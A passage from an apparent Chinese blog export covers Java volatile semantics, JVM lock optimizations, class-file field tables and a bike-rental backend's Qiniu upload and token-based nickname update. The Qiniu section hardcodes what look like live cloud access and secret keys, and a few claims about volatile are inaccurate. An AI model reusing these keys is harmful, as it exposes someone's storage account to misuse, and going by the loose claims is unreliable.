值为11，而CONSTANT_Methodref_info的tag值为10； CONSTANT_InterfaceMethodref_info 描述的是接口中定义的方法，而CONSTANT_Methodref_info描述的是实例类中的方法； 其他的基本与上面一个一毛一样。参照上面个理解即可。 13. CONSTANT_MethodType_info，CONSTANT_MethodHandle_info，CONSTANT_InvokeDynamic_info这三项主要是为了让Java语言支持动态语言特性而在Java 7 版本中新增的三个常量池项，只会在极其特别的情况能用到它，在class文件中几乎不会生成这三个常量池项。 其实我花了一些时间来研究这三项，并且想通过各种方式生成这三项，不过没有成功，最后搞的还是迷迷糊糊的。从我了解到的信息来看，Java 7对动态语言的支持很笨拙，并且当前没有什么应用价值，然后就对着三项的研究先放一放了。）]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[六、volatile详解]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%AD%E3%80%81volatile%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[理解volatile特性的一个好方法是：把对volatile变量的单个读/写，看成是使用同一个监视器锁对这些单个读/写操作做了同步。 1. 什么是volatilevolatile关键字的目的是为了标记一个Java变量，使得其能够存储于主内存中。更加具体的说，是每次都会直接从电脑的主内存中读取这个变量，而不是从CPU的高速缓存里面。同样的，每次写入都会写入到主内存中，而不是cache里面。 事实上，从Java5开始，volatile关键字的作用就不只是保证变量只会从主存里面读写了，接下来就来阐述这一概念。 2. 为什么要用volatileVolatile变量修饰符如果使用恰当的话，它比synchronized的使用和执行成本会更低，因为它不会引起线程上下文的切换和调度。 一旦一个共享变量（类的成员变量、类的静态成员变量）被volatile修饰之后，那么就具备了两层语义： 1） 保证了不同线程对这个变量进行操作时的可见性，即一个线程修改了某个变量的值，这新值对其他线程来说是立即可见的。 2） 禁止进行指令重排序。 3. volatile的原理简介voliatile关键字保证了在进程中变量的变化的可见性。 在多线程的应用里，如果线程操作了一个没有被volatile关键字标记的变量，那么每个线程都会在使用到这个变量时从主存里拷贝这个变量到CPU的cache里面（为了性能！）。如果你的电脑有多于一个CPU，那么每个线程都会在不同的CPU上面运行，这意味着每个线程都会把这个变量拷贝到不同的CPU cache里面，正如下图所示： 一个不带有volatile关键字的变量在JVM从主存里面读取数据到CPU cache或者从cache里面写入数据到主存时是没有保证的，这会导致一些问题，在接下来的章节中我们就来讨论这些问题。 想象这样一个场景，当一到两个线程允许去共享一个包含了一个计数变量的对象，这个计数变量如下所定义 12345public class SharedObject &#123; public int counter = 0; //无关键字&#125; 然后，这线程一增加了counter变量的值，但是，但是同时线程一和线程二都有可能随时读取这个counter变量。 如果这个counter变量未曾使用volatile声明，那么我们就无法保证这个变量在两个线程中所位于的CPU的cache和主存中的值是否保持一致了。示意图如下： 那么部分的线程就不能看到这个变量最新的样子，因为这个变量还没有被线程写回到主存中，这就是可视性的问题，这个线程更新的变量对于其他线程是不可视的。 在声明了counter变量的volatile关键字后，所有写入到counter变量的值会被立即写回到主存中。同时，所有读取这个变量的线程会直接从主存里面读取这个变量，下面的代码就是声明带volatile关键字的变量的方法 12345public class SharedObject &#123; public volatile int counter = 0;&#125; 如此声明这个变量就保证了这个变量对于其他写这个变量的线程的可视性。 总结： 处理器为了提高处理速度，不直接和内存进行通讯，而是先将系统内存的数据读到内部缓存（L1,L2或其他）后再进行操作，但操作完之后不知道何时会写到内存，如果对声明了Volatile变量进行写操作，JVM就会向处理器发送一条Lock前缀的指令，将这个变量所在缓存行的数据写回到系统内存。但是就算写回到内存，如果其他处理器缓存的值还是旧的，再执行计算操作就会有问题，所以在多处理器下，为了保证各个处理器的缓存是一致的，就会实现缓存一致性协议，每个处理器通过嗅探在总线上传播的数据来检查自己缓存的值是不是过期了，当处理器发现自己缓存行对应的内存地址被修改，就会将当前处理器的缓存行设置成无效状态，当处理器要对这个数据进行修改操作的时候，会强制重新从系统内存里把数据读到处理器缓存里。 简而言之，归纳为： 第一：使用volatile关键字会强制将修改的值立即写入主存； 第二：使用volatile关键字的话，当线程2进行修改时，会导致线程1的工作内存中缓存变量stop的缓存行无效（反映到硬件层的话，就是CPU的L1或者L2缓存中对应的缓存行无效）； 第三：由于线程1的工作内存中缓存变量stop的缓存行无效，所以线程1再次读取变量stop的值时会去主存读取。 4. volatile的特性12345678910111213141516class VolatileFeaturesExample &#123; volatile long vl = 0L; //使用volatile声明64位的long型变量 public void set(long l) &#123; vl = l; //单个volatile变量的写 &#125; public void getAndIncrement () &#123; vl++; //复合（多个）volatile变量的读/写 &#125; public long get() &#123; return vl; //单个volatile变量的读 &#125;&#125; 假设有多个线程分别调用上面程序的三个方法，这个程序在语意上和下面程序等价： 1234567891011121314151617class VolatileFeaturesExample &#123; long vl = 0L; // 64位的long型普通变量 public synchronized void set(long l) &#123; //对单个的普通 变量的写用同一个监视器同步 vl = l; &#125; public void getAndIncrement () &#123; //普通方法调用 long temp = get(); //调用已同步的读方法 temp += 1L; //普通写操作 set(temp); //调用已同步的写方法 &#125; public synchronized long get() &#123; //对单个的普通变量的读用同一个监视器同步 return vl; &#125;&#125; 如上面示例程序所示，对一个volatile变量的单个读/写操作，与对一个普通变量的读/写操作使用同一个监视器锁来同步，它们之间的执行效果相同。 监视器锁的happens-before规则保证释放监视器和获取监视器的两个线程之间的内存可见性，这意味着对一个volatile变量的读，总是能看到（任意线程）对这个volatile变量最后的写入。 监视器锁的语义决定了临界区代码的执行具有原子性。这意味着即使是64位的long型和double型变量，只要它是volatile变量，对该变量的读写就将具有原子性。如果是多个volatile操作或类似于volatile++这种复合操作，这些操作整体上不具有原子性。 简而言之，volatile变量自身具有下列特性： 可见性。对一个volatile变量的读，总是能看到（任意线程）对这个volatile变量最后的写入。 原子性：对任意单个volatile变量的读/写具有原子性，但类似于volatile++这种复合操作不具有原子性。 有序性：happens-before 原则，如果两个操作的执行次序无法从happens-before原则推导出来，那么它们就不能保证它们的有序性，虚拟机可以随意地对它们进行重排序。 而普通的共享变量不能保证可见性，因为普通共享变量被修改之后，什么时候被写入主存是不确定的，当其他线程去读取时，此时内存中可能还是原来的旧值，因此无法保证可见性。 另外，通过synchronized和Lock也能够保证可见性，synchronized和Lock能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存当中。因此可以保证可见性。 5. 原子性操作请分析以下哪些操作是原子性操作： 1234x = 10; //语句1y = x; //语句2x++; //语句3x = x + 1; //语句4 咋一看，可能会说上面的4个语句中的操作都是原子性操作。其实只有语句1是原子性操作，其他三个语句都不是原子性操作。 语句1是直接将数值10赋值给x，也就是说线程执行这个语句的会直接将数值10写入到工作内存中。 语句2实际上包含2个操作，它先要去读取x的值，再将x的值写入工作内存，虽然读取x的值以及 将x的值写入工作内存 这2个操作都是原子性操作，但是合起来就不是原子性操作了。 同样的，x++和 x = x+1包括3个操作：读取x的值，进行加1操作，写入新的值。 所以上面4个语句只有语句1的操作具备原子性。 也就是说，只有简单的读取、赋值（而且必须是将数字赋值给某个变量，变量之间的相互赋值不是原子操作）才是原子操作。 从上面可以看出，Java内存模型只保证了基本读取和赋值是原子性操作，如果要实现更大范围操作的原子性，可以通过synchronized和Lock来实现。由于synchronized和Lock能够保证任一时刻只有一个线程执行该代码块，那么自然就不存在原子性问题了，从而保证了原子性。 6. volatile 对于happens-before的保证什么是happens-before？ 多线程有两个基本的问题，就是原子性和可见性，而happens-before规则就是用来解决可见性（我还是比较喜欢称之为可视性）的。 如: 在时间上，动作A发生在动作B之前，能不能保证B可以看见A？如果可以保证的话，那么就可以说hb(A,B) JVM保证了一下的几条法则： 如果A和B是同一个线程的，那么hb(A, B) 如果A是对锁的unlock，而B是对同一个锁的lock，那么hb(A, B)(即写优于读) 如果A是对volatile变量的写操作，B是对同一个变量的读操作，那么hb(A, B) 传递性：如果hb(A, B) 且 hb(B, C)，那么hb(A, C) 如果有两个线程 1234567thread1 thread2----------------------------------x = 1 (A)M.unlock (B)x = 2 (C) M.lock (D) y = x (E) 那么执行到E的时候，E能不能保证看到C步呢？ 由法则1，hb(D,E) 由法则2，hb(B,D) 由法则1, hb(A,B) 综上可以推出，hb(A, E)，但是推不出hb(C, E) 所以，E不一定能看见C，但是E一定能看见A 所以执行E的时候，有可能thread2看到的x的值还是1 补充：从内存语义的角度来说，volatile与监视器锁有相同的效果：volatile写和监视器的释放有相同的内存语义；volatile读与监视器的获取有相同的内存语义。 不懂？再来个例子： 12345678910111213141516class VolatileExample &#123; int a = 0; volatile boolean flag = false; public void writer() &#123; a = 1; //1 flag = true; //2 &#125; public void reader() &#123; if (flag) &#123; //3 int i = a; //4 …… &#125; &#125;&#125; 假设线程A执行writer()方法之后，线程B执行reader()方法。根据happens before规则，这个过程建立的happens before 关系可以分为两类： 根据程序次序规则，1 happens before 2; 3 happens before 4。 根据volatile规则，2 happens before 3。 根据happens before 的传递性规则，1 happens before 4。 上述happens before 关系的图形化表现形式如下： 在上图中，每一个箭头链接的两个节点，代表了一个happens before 关系。黑色箭头表示程序顺序规则；橙色箭头表示volatile规则；蓝色箭头表示组合这些规则后提供的happens before保证。 这里A线程写一个volatile变量后，B线程读同一个volatile变量。A线程在写volatile变量之前所有可见的共享变量，在B线程读同一个volatile变量后，将立即变得对B线程可见。 7. volatile写-读的内存语义volatile写的内存语义如下： 当写一个volatile变量时，JMM会把该线程对应的本地内存中的共享变量刷新到主内存。 以上面示例程序VolatileExample为例，假设线程A首先执行writer()方法，随后线程B执行reader()方法，初始时两个线程的本地内存中的flag和a都是初始状态。下图是线程A执行volatile写后，共享变量的状态示意图： 如上图所示，线程A在写flag变量后，本地内存A中被线程A更新过的两个共享变量的值被刷新到主内存中。此时，本地内存A和主内存中的共享变量的值是一致的。 volatile读的内存语义如下： 当读一个volatile变量时，JMM会把该线程对应的本地内存置为无效。线程接下来将从主内存中读取共享变量。 如上图所示，在读flag变量后，本地内存B已经被置为无效。此时，线程B必须从主内存中读取共享变量。线程B的读取操作将导致本地内存B与主内存中的共享变量的值也变成一致的了。 如果我们把volatile写和volatile读这两个步骤综合起来看的话，在读线程B读一个volatile变量后，写线程A在写这个volatile变量之前所有可见的共享变量的值都将立即变得对读线程B可见。 下面对volatile写和volatile读的内存语义做个总结： 线程A写一个volatile变量，实质上是线程A向接下来将要读这个volatile变量的某个线程发出了（其对共享变量所在修改的）消息。 线程B读一个volatile变量，实质上是线程B接收了之前某个线程发出的（在写这个volatile变量之前对共享变量所做修改的）消息。 线程A写一个volatile变量，随后线程B读这个volatile变量，这个过程实质上是线程A通过主内存向线程B发送消息。 8. volatile不能确保原子性1234567891011121314151617181920212223public class Test &#123; public volatile int inc = 0; public void increase() &#123; inc++; &#125; public static void main(String[] args) &#123; final Test test = new Test(); for(int i=0;i&lt;10;i++)&#123; new Thread()&#123; public void run() &#123; for(int j=0;j&lt;1000;j++) test.increase(); &#125;; &#125;.start(); &#125; while(Thread.activeCount()&gt;1) //保证前面的线程都执行完，自旋等待 Thread.yield(); System.out.println(test.inc); &#125;&#125; 大家想一下这段程序的输出结果是多少？也许有些朋友认为是10000。但是事实上运行它会发现每次运行结果都不一致，都是一个小于10000的数字。 可能有的朋友就会有疑问，不对啊，上面是对变量inc进行自增操作，由于volatile保证了可见性，那么在每个线程中对inc自增完之后，在其他线程中都能看到修改后的值啊，所以有10个线程分别进行了1000次操作，那么最终inc的值应该是1000*10=10000。 这里面就有一个误区了，volatile关键字能保证可见性没有错，但是上面的程序错在没能保证原子性。可见性只能保证每次读取的是最新的值，但是volatile没办法保证对变量的操作的原子性。 在前面已经提到过，自增操作是不具备原子性的，它包括读取变量的原始值、进行加1操作、写入工作内存。那么就是说自增操作的三个子操作可能会分割开执行，就有可能导致下面这种情况出现： 假如某个时刻变量inc的值为10， 线程1对变量进行自增操作，线程1先读取了变量inc的原始值，然后线程1被阻塞了； 然后线程2对变量进行自增操作，线程2也去读取变量inc的原始值，由于线程1只是对变量inc进行读取操作，而没有对变量进行修改操作，所以不会导致线程2的工作内存中缓存变量inc的缓存行无效，也不会导致主存中的值刷新，所以线程2会直接去主存读取inc的值，发现inc的值时10，然后进行加1操作，并把11写入工作内存，最后写入主存。 然后线程1接着进行加1操作，由于已经读取了inc的值，注意此时在线程1的工作内存中inc的值仍然为10，所以线程1对inc进行加1操作后inc的值为11，然后将11写入工作内存，最后写入主存。 那么两个线程分别进行了一次自增操作后，inc只增加了1。 根源就在这里，自增操作不是原子性操作，而且volatile也无法保证对变量的任何操作都是原子性的。 解决方案：可以通过synchronized或lock，进行加锁，来保证操作的原子性。也可以通过AtomicInteger。 9. volatile的应用场景 volatile关键字只能对32位和64位的变量使用 synchronized关键字是防止多个线程同时执行一段代码，那么就会很影响程序执行效率，而volatile关键字在某些情况下性能要优于synchronized，但是要注意volatile关键字是无法替代synchronized关键字的，因为volatile关键字无法保证操作的原子性。通常来说，使用volatile必须具备以下2个条件： 1）对变量的写操作不依赖于当前值 2）该变量没有包含在具有其他变量的不变式中 下面列举几个Java中使用volatile的几个场景。 ①.状态标记量123456789volatile boolean flag = false; //线程1while(!flag)&#123; doSomething();&#125; //线程2public void setFlag() &#123; flag = true;&#125; ②.单例模式中的double check1234567891011121314151617class Singleton&#123; private volatile static Singleton instance = null; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; if(instance==null) &#123; synchronized (Singleton.class) &#123; if(instance==null) instance = new Singleton();//非原子操作 &#125; &#125; return instance; &#125;&#125; instance = new Singleton();//非原子操作 执行这一句，JVM发生了如下事情： 给 instance 分配内存 调用 Singleton 的构造函数来初始化成员变量 将instance对象指向分配的内存空间（执行完这步 instance 就为非 null 了） 但是在 JVM 的即时编译器中存在指令重排序的优化。也就是说上面的第二步和第三步的顺序是不能保证的，最终的执行顺序可能是 1-2-3 也可能是 1-3-2。如果是后者，则在 3 执行完毕、2 未执行之前，被线程二抢占了，这时 instance 已经是非 null 了（但却没有初始化），所以线程二会直接返回 instance，然后使用，然后顺理成章地报错。 有一篇文章讲的特别好：https://blog.csdn.net/javazejian/article/details/72772461]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八、整合云存储]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%AB%E3%80%81%E6%95%B4%E5%90%88%E4%BA%91%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[整合云存储 1、引入依赖：123456&lt;!--七牛云--&gt;&lt;dependency&gt; &lt;groupId&gt;com.qiniu&lt;/groupId&gt; &lt;artifactId&gt;qiniu-java-sdk&lt;/artifactId&gt; &lt;version&gt;[7.2.0, 7.2.99]&lt;/version&gt;&lt;/dependency&gt; 2、密钥：123456789/***七牛keys start****/public static final String QINIU_ACCESS_KEY="nEtJ89BgDDjEaB8yyFWGu-IUohR0Fpv299cGAQxU";public static final String QINIU_SECRET_KEY="qXb6cXyPdYv8ch_xvd2gHDjqVezJ9MoLMcf0zRDc";public static final String QINIU_HEAD_IMG_BUCKET_NAME="njupt";public static final String QINIU_HEAD_IMG_BUCKET_URL="http://oyii3l15f.bkt.clouddn.com/";/***七牛keys end****/ 3、上传的工具类：12345678910111213public class QiniuFileUploadUtil &#123; public static String uploadHeadImg(MultipartFile file) throws IOException &#123; Configuration cfg = new Configuration(Zone.zone2()); UploadManager uploadManager = new UploadManager(cfg); Auth auth = Auth.create(Constants.QINIU_ACCESS_KEY, Constants.QINIU_SECRET_KEY); String upToken = auth.uploadToken(Constants.QINIU_HEAD_IMG_BUCKET_NAME); Response response = uploadManager.put(file.getBytes(),null, upToken); //解析上传成功的结果 DefaultPutRet putRet = new Gson().fromJson(response.bodyString(), DefaultPutRet.class); return putRet.key; &#125;&#125; 4、controller:123456789101112131415161718@RequestMapping(value = "/uploadHeadImg", method = RequestMethod.POST)public ApiResult&lt;String&gt; uploadHeadImg(HttpServletRequest req, @RequestParam(required=false ) MultipartFile file) &#123; ApiResult&lt;String&gt; resp = new ApiResult&lt;&gt;(); try &#123; UserElement ue = getCurrentUser(); userService.uploadHeadImg(file,ue.getUserId()); resp.setMessage("上传成功"); &#125; catch (BikeException e) &#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125; catch (Exception e) &#123; log.error("Fail to update user info", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 5、service： 12345678910111213141516@Overridepublic String uploadHeadImg(MultipartFile file, Long userId) throws BikeException &#123; try &#123; //获取user 得到原来的头像地址 User user = userMapper.selectByPrimaryKey(userId); // 调用七牛 String imgUrlName = QiniuFileUploadUtil.uploadHeadImg(file); user.setHeadImg(imgUrlName); //更新用户头像URL userMapper.updateByPrimaryKeySelective(user); return Constants.QINIU_HEAD_IMG_BUCKET_URL+"/"+Constants.QINIU_HEAD_IMG_BUCKET_NAME+"/"+imgUrlName; &#125; catch (Exception e) &#123; log.error(e.getMessage(),e); throw new BikeException("头像上传失败"); &#125;&#125;]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八、JVM对synchronized的优化]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%AB%E3%80%81JVM%E5%AF%B9synchronized%E7%9A%84%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[聊一聊JVM对synchronized的优化。 1）锁消除概念JVM在JIT编译(即时编译)时，通过对运行上下文的扫描，去除掉那些不可能发生共享资源竞争的锁，从而节省了线程请求这些锁的时间。 举例 StringBuffer的append方法是一个同步方法，如果StringBuffer类型的变量是一个局部变量，则该变量就不会被其它线程所使用，即对局部变量的操作是不会发生线程不安全的问题。在这种情景下，JVM会在JIT编译时自动将append方法上的锁去掉。 2）锁粗化概念将多个连续的加锁、解锁操作连接在一起，扩展成一个范围更大的锁，即将加锁的粒度放大。 举例在for循环里的加锁/解锁操作，一般需要放到for循环外。 3）自旋锁 背景：互斥同步对性能最大的影响是阻塞，挂起和恢复线程都需要转入内核态中完成；并且通常情况下，共享数据的锁定状态只持续很短的一段时间，为了这很短的一段时间进行上下文切换并不值得。 原理：当一条线程需要请求一把已经被占用的锁时，并不会进入阻塞状态，而是继续持有CPU执行权等待一段时间，该过程称为『自旋』。 优点：由于自旋等待锁的过程线程并不会引起上下文切换，因此比较高效； 缺点：自旋等待过程线程一直占用CPU执行权但不处理任何任务，因此若该过程过长，那就会造成CPU资源的浪费。 自适应自旋：自适应自旋可以根据以往自旋等待时间的经验，计算出一个较为合理的本次自旋等待时间。 4）使用偏向锁和轻量级锁说明1)java6为了减少获取锁和释放锁带来的性能消耗，引入了偏向锁和轻量级锁。 2)锁一共有4种状态，级别从低到高依次是：无锁状态、偏向锁、轻量级锁、重量级锁。 3)锁的状态会随着竞争情况逐渐升级，并且只可以升级而不能降级。 【轻量级锁】 本质：使用CAS取代互斥同步。 背景：『轻量级锁』是相对于『重量级锁』而言的，而重量级锁就是传统的锁。 轻量级锁与重量级锁的比较： 重量级锁是一种悲观锁，它认为总是有多条线程要竞争锁，所以它每次处理共享数据时，不管当前系统中是否真的有线程在竞争锁，它都会使用互斥同步来保证线程的安全； 而轻量级锁是一种乐观锁，它认为锁存在竞争的概率比较小，所以它不使用互斥同步，而是使用CAS操作来获得锁，这样能减少互斥同步所使用的『互斥量』带来的性能开销。 实现原理： 对象头称为『Mark Word』，虚拟机为了节约对象的存储空间，对象处于不同的状态下，Mark Word中存储的信息也所有不同 Mark Word中有个标志位用来表示当前对象所处的状态 当线程请求锁时，若该锁对象的Mark Word中标志位为01（未锁定状态），则在该线程的栈帧中创建一块名为『锁记录』的空间，然后将锁对象的Mark Word拷贝至该空间；最后通过CAS操作将锁对象的Mark Word指向该锁记录； 若CAS操作成功，则轻量级锁的上锁过程成功； 若CAS操作失败，再判断当前线程是否已经持有了该轻量级锁；若已经持有，则直接进入同步块；若尚未持有，则表示该锁已经被其他线程占用，此时轻量级锁就要膨胀成重量级锁。 使用前提: 轻量级锁比重量级锁性能更高的前提是，在轻量级锁被占用的整个同步周期内，不存在其他线程的竞争。若在该过程中一旦有其他线程竞争，那么就会膨胀成重量级锁，从而除了使用互斥量以外，还额外发生了CAS操作，因此更慢！ 优点：在没有多线程竞争的前提下，减少传统的重量级锁带来的性能损耗。 缺点：竞争的线程如果始终得不到锁，自旋会消耗cpu。 应用：追求响应时间，同步块执行速度非常快。 【偏向锁】引入偏向锁是为了在无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径，因为轻量级锁的获取及释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销操作的性能损耗必须小于节省下来的CAS原子指令的性能消耗）。轻量级锁是为了在线程交替执行同步块时提高性能，而偏向锁则是在只有一个线程执行同步块时进一步提高性能。 1)背景：大多数情况下，锁不仅不存在多线程竞争，而且总是由同一线程多次获得，为了让线程获得锁的代价更低而引入了偏向锁。 2)概念：核心思想就是锁会偏向第一个获取它的线程，如果在接下来的执行过程中没有其它的线程获取该锁，则持有偏向锁的线程永远不需要同步。 3)目的：偏向锁实际上是一种优化锁，其目的是为了减少数据在无竞争情况下的性能损耗。 4)原理： 如果偏向锁的标识位为0，说明此时是处于无锁状态，则当前线程通过CAS操作尝试获取偏向锁，如果获取锁成功，则将Mark Word中的偏向线程ID设置为当前线程ID；并且将偏向标识位设为1。 如果是偏向锁，则判断Mark Word中的偏向线程ID是否指向当前线程，如果偏向线程ID指向当前线程，则表明当前线程已经获取到了锁； 如果偏向线程ID并未指向当前线程，则通过CAS操作尝试获取偏向锁，如果获取锁成功，则将Mark Word中的偏向线程ID设置为当前线程ID； 如果CAS获取偏向锁失败，则表示有竞争。获得偏向锁的线程被挂起，偏向锁升级为轻量级锁，然后被阻塞在安全点的线程继续往下执行同步代码。 4)偏向锁的释放: 当其它的线程尝试获取偏向锁时，持有偏向锁的线程才会释放偏向锁。 释放偏向锁需要等待全局安全点(在这个时间点上没有正在执行的字节码)。 首先暂停拥有偏向锁的线程，然后检查持有偏向锁的线程是否活着，如果线程不处于活动状态，则将对象头设置成无锁状态， 如果线程还活着，说明此时发生了竞争，则偏向锁升级为轻量级锁，然后刚刚被暂停的线程会继续往下执行同步代码。 【重量级锁】Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的Mutex Lock来实现的。而操作系统实现线程之间的切换这就需要从用户态转换到核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此，这种依赖于操作系统Mutex Lock所实现的锁我们称之为“重量级锁”。JDK中对Synchronized做的种种优化，其核心都是为了减少这种重量级锁的使用。 说明： java6之前的synchronized属于重量级锁，效率低下，因为monitor是依赖操作系统的Mutex Lock(互斥量)来实现的。 操作系统实现线程之间的切换需要从用户态转换到核心态，这个状态之间的转换需要相对较长的时间，时间成本相对较高。 在互斥状态下，没有得到锁的线程会被挂起阻塞，而挂起线程和恢复线程的操作都需要从用户态转入内核态中完成。 优点：线程竞争不使用自旋，不会消耗cpu。 缺点：线程阻塞，响应时间缓慢。 应用：同步块执行速度较长]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八、Class文件中的字段表集合--field字段在class文件中是怎样组织的]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%85%AB%E3%80%81Class%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E8%A1%A8%E9%9B%86%E5%90%88--field%E5%AD%97%E6%AE%B5%E5%9C%A8class%E6%96%87%E4%BB%B6%E4%B8%AD%E6%98%AF%E6%80%8E%E6%A0%B7%E7%BB%84%E7%BB%87%E7%9A%84%2F</url>
    <content type="text"><![CDATA[继续讲class文件中的字段表集合。 1. 字段表集合概述字段表集合是指由若干个字段表（field_info）组成的集合。对于在类中定义的若干个字段，经过JVM编译成class文件后，会将相应的字段信息组织到一个叫做字段表集合的结构中，字段表集合是一个类数组结构，如下图所示： 注意：这里所讲的字段是指在类中定义的静态或者非静态的变量，而不是在类中的方法内定义的变量。请注意区别。比如，如果某个类中定义了5个字段，那么，JVM在编译此类的时候，会生成5个字段表（field_info）信息,然后将字段表集合中的字段计数器的值设置成5，将5个字段表信息依次放置到字段计数器的后面。 2. 字段表集合在class文件中的位置字段表集合紧跟在class文件的接口索引集合结构的后面，如下图所示： 3. Java中的一个Field字段应该包含那些信息？——字段表field_info结构体的定义 针对上述的字段表示，JVM虚拟机规范规定了field_info结构体来描述字段，其表示信息如下： 下面我将一一讲解FIeld_info的组成元素：访问标志（access_flags）、名称索引（name_index）、描述索引（descriptor_index）、属性表集合 4. field字段的访问标志如上图所示定义的field_info结构体，field字段的访问标志(access_flags)占有两个字节，它能够表述的信息如下所示： 举例：如果我们在某个类中有定义field域：private static String str;，那么在访问标志上，第15位ACC_PRIVATE和第13位ACC_STATIC标志位都应该为1。field域str的访问标志信息应该是如下所示： 5. 字段的数据类型表示和字段名称表示class文件对数据类型的表示如下图所示： field字段名称，我们定义了一个形如private static String str的field字段，其中”str”就是这个字段的名称。class文件将字段名称和field字段的数据类型表示作为字符串存储在常量池中。在field_info结构体中，紧接着访问标志的，就是字段名称索引和字段描述符索引，它们分别占有两个字节，其内部存储的是指向了常量池中的某个常量池项的索引，对应的常量池项中存储的字符串，分别表示该字段的名称和字段描述符。 6. 属性表集合—–静态field字段的初始化在定义field字段的过程中，我们有时候会很自然地对field字段直接赋值，如下所示： 12public static final int MAX=100; public int count=0; 对于虚拟机而言，上述的两个field字段赋值的时机是不同的： 对于非静态（即无static修饰）的field字段的赋值将会出现在实例构造方法()中 对于静态的field字段，有两个选择：1、在静态构造方法()中进行；2 、使用ConstantValue属性进行赋值 Sun javac编译器对于静态field字段的初始化赋值策略： 如果使用final和static同时修饰一个field字段，并且这个字段是基本类型或者String类型的，那么编译器在编译这个字段的时候，会在对应的field_info结构体中增加一个ConstantValue类型的结构体，在赋值的时候使用这个ConstantValue进行赋值； 如果该field字段并没有被final修饰，或者不是基本类型或者String类型，那么将在类构造方法()中赋值。 对于上述的public static final init MAX=100： javac编译器在编译此field字段构建field_info结构体时，除了访问标志、名称索引、描述符索引外，会增加一个ConstantValue类型的属性表。 7. 实例解析定义如下一个简单的Simple类，然后通过查看Simple.class文件内容并结合javap -v Simple 生成的常量池内容，分析str field字段的结构： 1234public class Simple &#123; private transient static final String str ="This is a test"; &#125; 字段计数器中的值为0x0001,表示这个类就定义了一个field字段 字段的访问标志是0x009A,二进制是00000000 10011010，即第9、12、13、15位标志位为1，这个字段的标志符有：ACC_TRANSIENT、ACC_FINAL、ACC_STATIC、ACC_PRIVATE; 名称索引中的值为0x0005,指向了常量池中的第5项，为“str”,表明这个field字段的名称是str； 描述索引中的值为0x0006,指向了常量池中的第6项，为”Ljava/lang/String;”，表明这个field字段的数据类型是java.lang.String类型； 5.属性表计数器中的值为0x0001,表明field_info还有一个属性表； 6.属性表名称索引中的值为0x0007,指向常量池中的第7项，为“ConstantValue”,表明这个属性表的名称是ConstantValue，即属性表的类型是ConstantValue类型的； 7.属性长度中的值为0x0002，因为此属性表是ConstantValue类型，它的值固定为2； 8.常量值索引 中的值为0x0008,指向了常量池中的第8项，为CONSTANT_String_info类型的项，表示“This is a test” 的常量。在对此field赋值时，会使用此常量对field赋值。]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[五、整合昵称修改功能]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%BA%94%E3%80%81%E6%95%B4%E5%90%88%E6%98%B5%E7%A7%B0%E4%BF%AE%E6%94%B9%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[用户登录功能 1、修改昵称的操作显然是用户登录之后的操作，也就是token存在并且有效的时候。那么如何取到token，根据token取到用户，然后拿出userId，这样根据用户id就可以实现数据库的更新。 首先是有一个controller用来接收移动端发来的json（用户信息）： 123456789101112131415161718@RequestMapping("/modifyNickName")public ApiResult modifyNickName(@RequestBody User user)&#123; ApiResult resp = new ApiResult(); try&#123; UserElement ue = getCurrentUser(); user.setId(ue.getUserId()); userService.modifyNickName(user); &#125;catch (BikeException be)&#123; resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage(be.getMessage()); &#125; catch (Exception e)&#123; log.error("fail to login",e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 这里有一个UserElement ue = getCurrentUser();这个方法是写在BaseController中，要从缓存中拿用户数据，那么就直接继承这个controller，调用这个方法即可： 1234567891011121314151617181920@Slf4jpublic class BaseController &#123; @Autowired private CommonCacheUtil cacheUtil; protected UserElement getCurrentUser() &#123; HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest(); String token = request.getHeader(Constants.REQUEST_TOKEN_KEY); if(!StringUtils.isBlank(token))&#123; try &#123; UserElement ue = cacheUtil.getUserByToken(token); return ue; &#125; catch (Exception e) &#123; log.error("fail to get user by token"); throw e; &#125; &#125; return null; &#125;&#125; 这里首先是获取移动端发来的跟随url的头参数，即token，这里规定发送格式为user-token，即REQUEST_TOKEN_KEY，然后根据这个token从缓存中取用户数据： 12345678910111213141516171819202122public UserElement getUserByToken(String token) &#123; UserElement ue = null; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis jedis = pool.getResource()) &#123; jedis.select(0); try &#123; Map&lt;String,String&gt; map = jedis.hgetAll(TOKEN_PREFIX+token); if(!CollectionUtils.isEmpty(map))&#123; ue = UserElement.fromMap(map); &#125;else &#123; log.warn("fail to find cache element for token"); &#125; &#125; catch (Exception e) 